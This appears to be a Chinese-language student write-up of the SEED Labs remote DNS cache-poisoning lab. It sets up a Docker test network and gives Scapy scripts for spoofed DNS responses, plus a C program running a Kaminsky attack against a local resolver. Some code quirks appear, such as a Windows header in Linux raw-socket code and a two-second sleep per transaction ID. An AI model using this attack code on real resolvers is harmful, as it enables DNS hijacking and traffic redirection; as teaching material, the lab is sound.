---
hide:
  #- navigation # 显示右
  #- toc #显示左
  - footer
  - feedback
comments: true
---  

# DNS Remote

## 配置容器

下载 [Labsetup.zip](https://seedsecuritylabs.org/Labs_20.04/Networking/DNS/DNS_Remote/) 到本地，解压缩后 `dcbuild` 和 `dcup` 启动容器：

![](../../../../../assets/Pasted%20image%2020250404160806.png)
***
### 攻击者容器

攻击者容器与其他容器有两点不同：

- 共享文件夹，使用 Docker Volumes 在主机和容器之间创建了共享文件夹：
- Host 模式，允许攻击者看到所有的容量

![](../../../../../assets/Pasted%20image%2020250404161234.png)
***
### DNS 配置

- 本地 DNS 服务器：运行 BIND 9 DNS 服务器程序
	- 固定端口号：现在的 DNS 会随机化 DNS 查询的源端口号，这会使得攻击变得更加困难，为了简化实验使用固定端口号 33333
	- 关闭 DNSSEC：DNSSEC 是为防止对 DNS 服务器攻击引入的安全机制，我们关闭这样的安全机制完成攻击
	
	![](../../../../../assets/Pasted%20image%2020250404162501.png)
	
	- 转发区域：添加一个转发区域，当有人查询 `attacker32.com` 时查询会被转发到攻击者容器（10.9.0.153）的域名服务器
	
	![](../../../../../assets/Pasted%20image%2020250404162623.png)
	
- 用户容器：将用户容器（10.9.0.5）的本地 DNS 服务器设置为 10.9.0.53，作为首选 DNS 服务器

![](../../../../../assets/Pasted%20image%2020250404162822.png)

- 攻击者域名服务器：有两个区域，一个是攻击者的合法区域 attacker32.com，另一个是伪造的 example.com

![](../../../../../assets/Pasted%20image%2020250404163217.png)
***
### 测试 DNS 设置

- 获取 ns.attacker32.com 的 IP 地址：
	- 在用户容器中运行 `dig ns.attacker32.com`：
	
	![](../../../../../assets/Pasted%20image%2020250404192531.png)
	
	- 其中 `ANSWER SECTION` 部分说明成功解析了 ns.attacker32.com 的私有 IP 10.9.0.153（Attacker）
- 获取 www.example.com 的 IP 地址：
	- 在用户容器中运行 `dig www.example.com`：
	
	![](../../../../../assets/Pasted%20image%2020250404193811.png)
	
	- 其中 `ANSWER SECTION` 部分说明 www.example.com 跳转到 www.example.com-v4.edgesuite.net. ，再跳转到 a1422.dscr.akamai.net.，最后解析为官方服务器 23.210.7.166/179
	- 运行 `dig @ns.attacker32.com www.example.com`：
	
	![](../../../../../assets/Pasted%20image%2020250404194722.png)
	
	- 可以发现首先 SERVER 变动了，改变为攻击者的 IP 地址，且查询时间显著减少（因为SERVER 在同一个子网下）
	- 最后解析为攻击者服务器对其配置的 IP 1.2.3.5
	
	![](../../../../../assets/Pasted%20image%2020250404205149.png)
	
***
## 构造 DNS 请求

在攻击者容器中编写发送 DNS 请求的代码 `DNS_Request.py`：

```python title="DNS_Request.py"
from scapy.all import *

Qdsec = DNSQR(qname = 'twysw.example.com')
dns = DNS(id = 0xAAAA, qr = 0, qdcount = 1, ancount = 0, nscount = 0, arcount = 0, qd = Qdsec)

ip = IP(dst = '10.9.0.53', src = '10.9.0.153')
udp = UDP(dport = 53, sport = 33333, chksum = 0)
request = ip/udp/dns

send(request, verbose = 0)
```

在攻击者容器中运行 `tshark -i eth0 -f "udp port 53 and host 10.9.0.53" -Y "dns"` 开启监听：（这里容器没有 tshark，以及 pip？）

![](../../../../../assets/Pasted%20image%2020250404220411.png)

运行 `python3 DNS_Request.py` 发送 DNS 请求，再次观察 tshark 的输出：

![](../../../../../assets/Pasted%20image%2020250405140403.png)

可以看到 DNS 请求已经发送成功，查询并无 twysw.example.com 这个域名

有趣的是，有的时候发送 DNS 请求会出现 DNS 77 Standard query response 0xaaaa Server failure A twysw.example.com，猜测是有概率得到 response？
***
## 伪造 DNS 响应

同样，在攻击者容器中编写伪造 DNS 响应的代码 `DNS_Response.py`：

```python title="DNS_Response.py"
from scapy.all import *

name = 'twysw.example.com'
domain = 'example.com'
ns = 'ns.attacker32.com'

Qdsec = DNSQR(qname = name)
Anssec = DNSRR(rrname = name, type = 'A', rdata = '1.2.3.4', ttl = 259200)
NSsec = DNSRR(rrname = domain, type = 'NS', rdata = ns, ttl = 259200)
dns = DNS(id = 0xAAAA, aa = 1, rd = 1, qr = 1, qdcount = 1, ancount = 1, nscount = 1, arcount = 0, qd = Qdsec, an = Anssec, ns = NSsec)

ip = IP(dst = '10.9.0.53', src = '23.210.7.166')
udp = UDP(dport = 33333, sport = 53, chksum = 0)
reply = ip/udp/dns
send(reply) 
```

几个参数选择解释如下：

- name：要查询的域名
- domain：对应的上级域名
- ns：攻击者的 DNS 服务器
- dst：本地 DNS 服务器的 IP 地址
- src：真实权威 DNS 服务器的 IP 地址（伪装为真实的 DNS 响应）
- dport：本地 DNS 服务器的端口号
- sport：源端口

还是在攻击者容器中运行 `tshark -i eth0 -f "udp port 53 and host 10.9.0.53" -Y "dns"` 开启监听，再运行 `python3 DNS_Response.py` 发送伪造的 DNS 响应，观察 tshark 的输出：

![](../../../../../assets/Pasted%20image%2020250405142234.png)

可以看到伪造的 DNS 响应已经发送成功
***
## 进行 Kaminsky 攻击

首先我们用 Scapy 仿照之前的代码生成 DNS 请求数据包模板并保存在文件 ip_req.bin 中：

```python title="Generate_DNS_Request.py"
from scapy.all import *

Qdsec = DNSQR(qname = 'twysw.example.com')
dns = DNS(id = 0xAAAA, qr = 0, qdcount = 1, ancount = 0, nscount = 0, arcount = 0, qd = Qdsec)

ip = IP(dst = '10.9.0.53', src = '10.9.0.153')
udp = UDP(dport = 53, sport = 33333, chksum = 0)
request = ip/udp/dns

with open("ip_req.bin", "wb") as f:
    f.write(bytes(request))
```

再生成 DNS 响应数据包模板并保存在文件 ip_resp.bin 中：

```python title="Generate_DNS_Reply.py"
from scapy.all import *

name = 'twysw.example.com'
domain = 'example.com'
ns = 'ns.attacker32.com'

Qdsec = DNSQR(qname = name)
Anssec = DNSRR(rrname = name, type = 'A', rdata = '1.2.3.4', ttl = 259200)
NSsec = DNSRR(rrname = domain, type = 'NS', rdata = ns, ttl = 259200)
dns = DNS(id = 0xAAAA, aa = 1, rd = 1, qr = 1, qdcount = 1, ancount = 1, nscount = 1, arcount = 0, qd = Qdsec, an = Anssec, ns = NSsec)

ip = IP(dst = '10.9.0.53', src = '199.43.133.53')
udp = UDP(dport = 33333, sport = 53, chksum = 0)
pkt = ip/udp/dns

with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(pkt))
```

需要注意的是，这里的 src 应该是 example.com 的 nameserver 地址而非 www.example.com 本身的 IP 地址（因为我是要伪造从它发起的响应），我们使用 `dig ns example.com` 查询 example.com 的 nameserver 地址：

![](../../../../../assets/Pasted%20image%2020250410180348.png)

可以看到有两个 nameserver，我们再 dig 其中一个：

![](../../../../../assets/Pasted%20image%2020250410180441.png)

运行 `python3 Generate_DNS_Reply.py` 生成 DNS 数据包模板 `ip.bin`，再编写 C 程序构建向 DNS 服务器发送伪造的响应数据包 `Attack.c`：

```c title="Attack.c"
#include <stdlib.h>
#include <arpa/inet.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>
#include <windows.h>

#define MAX_FILE_SIZE 1000000


/* IP Header */
struct ipheader {
  unsigned char      iph_ihl:4, //IP header length
                     iph_ver:4; //IP version
  unsigned char      iph_tos; //Type of service
  unsigned short int iph_len; //IP Packet length (data + header)
  unsigned short int iph_ident; //Identification
  unsigned short int iph_flag:3, //Fragmentation flags
                     iph_offset:13; //Flags offset
  unsigned char      iph_ttl; //Time to Live
  unsigned char      iph_protocol; //Protocol type
  unsigned short int iph_chksum; //IP datagram checksum
  struct  in_addr    iph_sourceip; //Source IP address 
  struct  in_addr    iph_destip;   //Destination IP address 
};

void send_raw_packet(char * buffer, int pkt_size);
void send_dns_request(unsigned char *packet_template, int packet_size, char *subdomain);
void send_dns_response(unsigned char *packet_template, int packet_size, char *subdomain, int transaction_id);

int main()
{
  srand(time(NULL));

  // Load the DNS request packet from file
  FILE * f_req = fopen("ip_req.bin", "rb");
  if (!f_req) {
     perror("Can't open 'ip_req.bin'");
     exit(1);
  }
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);

  // Load the first DNS response packet from file
  FILE * f_resp = fopen("ip_resp.bin", "rb");
  if (!f_resp) {
     perror("Can't open 'ip_resp.bin'");
     exit(1);
  }
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);

  char a[26]="abcdefghijklmnopqrstuvwxyz";
  while (1) {
    // Generate a random name with length 5
    char name[6];
    name[5] = '\0';
    for (int k=0; k<5; k++)  name[k] = a[rand() % 26];

    send_dns_request(ip_req, n_req, name);

    for(int tid = 0; tid < 65536; tid++){
    	printf("tid: %u\n", tid);
        send_dns_response(ip_resp, n_resp, name, tid);
        sleep(2);
    }
  }
}


/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
void send_dns_request(unsigned char *packet_template, int packet_size, char *subdomain)
{
	memcpy(packet_template + 41, subdomain, 5);

	send_raw_packet(packet_template, packet_size);
}


/* Use for sending forged DNS response.
 * Add arguments to the function definition if needed.
 * */
void send_dns_response(unsigned char *packet_template, int packet_size, char *subdomain, int transaction_id)
{
	memcpy(packet_template + 41, subdomain, 5);

	memcpy(packet_template + 64, subdomain, 5);

	unsigned short id_net_order = htons(transaction_id);
	memcpy(packet_template + 28, &id_net_order, 2);

	send_raw_packet(packet_template, packet_size);
}


/* Send the raw packet out 
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char * buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
             &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *) buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
       (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}
```

编译 `gcc -o Attack Attack.c`，运行 `./Attack` 进行攻击
***
## 攻击结果验证

首先在本地 DNS 服务器使用命令 `rndc flush` 清空缓存（因为之前我们已经手动伪造过响应计入缓存了）

运行 Attack 程序后一段时间在本地 DNS 服务器使用命令 `rndc dumpdb -cache && grep attacker /var/cache/bind/dump.db`，得到结果：

![](../../../../../assets/Pasted%20image%2020250410180638.png)

我们直接在用户容器中 `dig www.example.com`，得到结果：

![](../../../../../assets/Pasted%20image%2020250410180732.png)

可以看到攻击已经成功，已经不是我们先前查到的服务器 IP 了




